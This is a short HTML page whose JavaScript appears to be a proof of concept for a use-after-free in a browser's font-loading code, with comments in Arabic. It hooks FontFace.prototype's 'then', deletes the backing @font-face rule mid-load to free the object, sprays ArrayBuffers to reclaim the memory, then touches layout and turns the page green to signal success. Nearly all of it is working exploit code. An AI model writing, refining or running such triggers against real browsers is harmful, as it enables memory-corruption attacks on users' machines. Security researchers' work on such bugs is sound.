<!DOCTYPE html>
<html>
<head>
<style id="s">
@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }
</style>
</head>
<body style="background: black;">

<script>
window.onload = () => {
    let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    let callbackCount = 0;
    
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (this === A) {
                callbackCount++;
                
                // تجربة العداد عند الاستدعاء الأول المباشر لـ setStatus
                if (callbackCount === 1) { 
                    
                    // تدمير الكائن المستهدف من الذاكرة
                    document.getElementById('s').sheet.deleteRule(0);
                    
                    // استخدام setTimeout بفترة 0 لفصل التنفيذ ومنع التجميد الصامت
                    setTimeout(() => {
                        let holder = [];
                        for (let i = 0; i < 20; i++) {
                            holder.push(new ArrayBuffer(0x400)); 
                        }
                        
                        // قراءة المؤشر بعد إعادة التهيئة
                        document.body.offsetTop;
                        
                        // تحويل الشاشة للأخضر لإثبات الاستقرار بعد الـ Use-After-Free
                        document.body.style.background = "green";
                    }, 0);
                }
            }
            return undefined;
        }
    });

    document.fonts.load('1em targetFont', 'AB');
};
</script>
</body>
</html>
